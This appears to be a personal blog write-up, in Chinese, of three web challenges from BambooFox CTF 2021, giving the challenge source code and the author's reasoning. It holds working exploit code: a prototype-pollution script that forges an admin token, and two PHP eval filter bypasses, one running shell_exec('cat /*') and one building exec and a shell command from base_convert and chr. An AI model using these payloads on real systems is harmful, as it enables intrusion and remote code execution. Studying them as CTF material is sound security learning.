---
title: BambooFox CTF 2021 writeup
catalog: true
date: 2021-01-24 22:27:27
tags: [Security]
categories:
  - Security
---

## 前言

最近的興趣是玩 CTF，而且只玩裡面的 web 題，原因很簡單，因為其他領域的我都不會...目前只對 web 的東西比較有興趣，就當作休閒娛樂來解題了。

這篇是 BambooFox CTF 2021 的解題心得，只解出了三題。

<!-- more -->

## Time to Draw

是一個畫圖然後會即時同步的網站，有附上 source code：

```js
const express = require("express");
const cookieParser = require('cookie-parser')
var crypto = require('crypto');
const secret = require("./secret");

const app = express();
app.use(cookieParser(secret.FLAG));

let canvas = {
    ...Array(128).fill(null).map(() => new Array(128).fill("#FFFFFF"))
};

const hash = (token) => crypto.createHash('sha256').update(token).digest('hex');

app.get('/', (req, res) => {
    if (!req.signedCookies.user)
        res.cookie('user', { admin: false }, { signed: true });

    res.sendFile(__dirname + "/index.html");
});

app.get('/source', (_, res) => {
    res.sendFile(__filename);
});

app.get('/api/canvas', (_, res) => {
    res.json(canvas);
});

app.get('/api/draw', (req, res) => {
    let { x, y, color } = req.query;
    if (x && y && color) canvas[x][y] = color.toString();
    res.json(canvas);
});

app.get('/promote', (req, res) => {
    if (req.query.yo_i_want_to_be === 'admin')
        res.cookie('user', { admin: true }, { signed: true });
    res.send('Great, you are admin now. <a href="/">[Keep Drawing]</a>');
});

app.get('/flag', (req, res) => {
    let userData = { isGuest: true };
    if (req.signedCookies.user && req.signedCookies.user.admin === true) {
        userData.isGuest = false;
        userData.isAdmin = req.cookies.admin;
        userData.token = secret.ADMIN_TOKEN;
    }

    if (req.query.token && req.query.token.match(/[0-9a-f]{16}/) &&
        hash(`${req.connection.remoteAddress}${req.query.token}`) === userData.token)
        res.send(secret.FLAG);
    else
        res.send("NO");
});

app.listen(3000, "0.0.0.0");
```

因為最近才解了一題 prototype pollution 的題目，所以一眼就看到：`if (x && y && color) canvas[x][y] = color.toString();` 跟最後一段的判斷：

``` js
if (req.query.token && req.query.token.match(/[0-9a-f]{16}/) &&
    hash(`${req.connection.remoteAddress}${req.query.token}`) === userData.token)
    res.send(secret.FLAG);
else
    res.send("NO");
```

只要透過原型污染就可以讓 userData.token 可控，接下來只要找到正確的值就行了。

最後的解法長這樣：

``` js
var axios = require('axios')
var crypto = require('crypto')
var baseUrl = 'http://chall.ctf.bamboofox.tw:8787'
var myip = '1.1.1.1'

const hash = (token) => crypto.createHash('sha256').update(token).digest('hex');
const token = '5555555555555555'

const hashValue = hash(`${myip}${token}`)

async function run() {
  await axios.get(baseUrl + '/api/draw?x=__proto__&y=token&color=' + hashValue)
  const response = await axios.get(baseUrl + '/flag?token=' + token)
  console.log(response.data)
}

run()
```

讓 x = `__proto__`，y = token，所以就會變成：`canvas['__proto__']['token'] = xxx`，達成 prototype pollution。

## ヽ(#`Д´)ﾉ

這一題給的程式碼非常簡短：

``` php
 <?= 
 	highlight_file(__FILE__) &&
 	strlen($🐱=$_GET['ヽ(#`Д´)ﾉ'])<0x0A &&
 	!preg_match('/[a-z0-9`]/i',$🐱) &&
 	eval(print_r($🐱,1)); 
```

限制看起來很嚴格，長度最多只能到 9，而且還不能有任何英文數字。

之前有解過類似的需要用 xor 或是 not 來產生字元，然後再用 PHP 可以用字串 function 名稱執行函式的特性來執行，最後達成 RCE。

不過這題的長度限制是 9，再怎麼想都不可能，因為光是基本的一些字元就已經超過了。

所以這題換個角度想，可以用 array 來試試看，自己實際試過之後發現 array 確實可以繞過，前面兩個判斷都可以通過，那接下來的問題就是該怎麼讓：`eval(print_r($🐱,1)` 可以順利執行。

這邊我一開始的想法是讓 print_r 出來的東西變成合法的 php 程式碼，就可以成功執行了，於是我先用 print_r 出來的格式去跑 php，嘗試過底下這樣：

``` php
<?php
 $arr = array(
  [0] => 1
 );
 print_r($arr);
?>
```

執行之後會輸出：PHP Fatal error: Illegal offset type in /Users/li.hu/Documents/playground/php-test/er.php on line 3

看起來是 array 的 index 不能是陣列，不然就會出錯。原本想說那這條路應該行不通了，後來我想說：「那既然會出錯，有沒有可能在出錯之前先執行我想執行的函式？」，就嘗試了以下程式碼：

``` php
<?php
 $arr = array(
  [0] => system("ls")
 );
 print_r($arr);
?>
```

發現還真的印出結果了！而且原本的 fatal error 變成了 warning：Warning: Illegal offset type in /Users/huli/Documents/security/ais/php-challenge/b.php on line 3

我到現在還是不知道為什麼，但只要 value 的部分有 function call 就會這樣。

所以只要讓 print_r 產生出來的東西變成一段合法程式碼，就可以插入任意字元，後半段用 `/*` 註解掉就好，最後的解法長這樣：

``` php
abs(1)); echo shell_exec("cat /*"); /*
```

先用 abs(1) 把 fatal error 變 warning，然後執行想要的程式碼，最後用註解把後面跳掉，成功拿到 flag。

賽後去看其他人的解法，發現 query string 原來這麼神奇。我一直以為 query string 頂多就是傳 array，像是這樣：`?a[]=1&a[]=2`，但後來才發現原來`[]`裡面可以有東西，像這樣：`?a[test]=1`，在 PHP 裡面你就可以拿到：

``` php
Array
(
    [test] => 1
)
```

如果是這樣的話，就可以讓 key 是 `/*`，value 是 `*/]); echo 123;/*`，組合起來就變成：

``` php
<?php
 Array(
  [/*] => "*/]); echo 123;/*"
 );
?>
```

就成功組出一段合法的 PHP 程式碼。

這一題學到最有價值的東西就是這個了，原來 query string 不只傳陣列，要傳物件也是可以的（至少 PHP 跟 express 都有支援，其他的我不確定）

## calc.exe online

一個計算機的程式，程式碼如下：

``` php
<?php
error_reporting(0);
isset($_GET['source']) && die(highlight_file(__FILE__));

function is_safe($query)
{
    $query = strtolower($query);
    preg_match_all("/([a-z_]+)/", $query, $words);
    $words = $words[0];
    $good = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh', 'ncr', 'npr', 'number_format'];
    $accept_chars = '_abcdefghijklmnopqrstuvwxyz0123456789.!^&|+-*/%()[],';
    $accept_chars = str_split($accept_chars);
    $bad = '';
    for ($i = 0; $i < count($words); $i++) {
        if (strlen($words[$i]) && array_search($words[$i], $good) === false) {
            $bad .= $words[$i] . " ";
        }
    }

    for ($i = 0; $i < strlen($query); $i++) {
        if (array_search($query[$i], $accept_chars) === false) {
            $bad .= $query[$i] . " ";
        }
    }
    return $bad;
}

function safe_eval($code)
{
    if (strlen($code) > 1024) return "Expression too long.";
    $code = strtolower($code);
    $bad = is_safe($code);
    $res = '';
    if (strlen(str_replace(' ', '', $bad)))
        $res = "I don't like this: " . $bad;
    else
        eval('$res=' . $code . ";");
    return $res;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css">
    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
    <title>Calc.exe online</title>
</head>
<style>
</style>

<body>
    <section class="hero">
        <div class="container">
            <div class="hero-body">
                <h1 class="title">Calc.exe Online</h1>
            </div>
        </div>
    </section>
    <div class="container" style="margin-top: 3em; margin-bottom: 3em;">
        <div class="columns is-centered">
            <div class="column is-8-tablet is-8-desktop is-5-widescreen">
                <form>
                    <div class="field">
                        <div class="control">
                            <input class="input is-large" placeholder="1+1" type="text" name="expression" value="<?= $_GET['expression'] ?? '' ?>" />
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <div class="columns is-centered">
            <?php if (isset($_GET['expression'])) : ?>
                <div class="card column is-8-tablet is-8-desktop is-5-widescreen">
                    <div class="card-content">
                        = <?= @safe_eval($_GET['expression']) ?>
                    </div>
                </div>
            <?php endif ?>
            <a href="/?source"></a>
        </div>
    </div>
</body>

</html>
```

簡單來說就是針對字串進行過濾，連續的英文字必須要出現在設定好的名單裡面才行，仔細一看會發現都是跟 math 有關的 function。

除此之外也不能有不合法的字元，例如說 `$`，否則就會失敗。

這一題滿多人解出來的，但我一開始看到的時候沒什麼頭緒，只覺得應該會滿麻煩的。睡了一覺醒來之後再看了一次那個 function 的清單，看到了 base_convert，是進制轉換的。

回想起之前寫的 [如何不用英文字母與數字寫出 console.log(1)？](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/) 那篇，其實就有講過可以透過進制轉換來產生出任意字元。

PHP 可以這樣執行程式碼：

``` php
<?php
 ("system")("ls /");
?>
```

所以只要能湊出 system 跟要執行的指令這兩個字串，這題就搞定了。

但要注意的是指令中會有空白跟 / 這些不能用進制轉換的字元，這怎麼辦呢？可以先湊出 `chr`，再用 chr 搭配 ascii code 就行了，就能產生任意字元。

最後的 payload 是這樣，組出 exec 跟 chr 然後組出指令：

```
(base_convert(14, 10, 36).base_convert(33, 10, 36).base_convert(14, 10, 36).base_convert(12,10,36))(base_convert(12, 10, 36).base_convert(10, 10, 36).base_convert(29, 10, 36).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(32).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(47).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(42))
```

話說我是手動組的，但我下次覺得應該要寫個程式才對...

## 總結

這次就解了這三題，因為是當作休閒娛樂所以也沒什麼壓力，看題目看一看沒想法就去做其他事，隔一段時間再回來繼續解。

比較遺憾的是另外兩題 web 都沒有解掉，其中一題是要利用特殊字元繞過檢查，可以用像是 [domain-obfuscator](https://github.com/splitline/domain-obfuscator) 的工具去嘗試，這也是值得去研究的一個議題，滿有趣的。

另外一題則是 SQL injection 搭配其他技巧，當初在解的時候稍微嘗試一下，沒找到什麼然後對這個主題也不是這麼熟悉，就沒有再繼續下去了。

總之呢，解 CTF 的題目還是相當有趣的，感謝主辦單位以及出題者們。
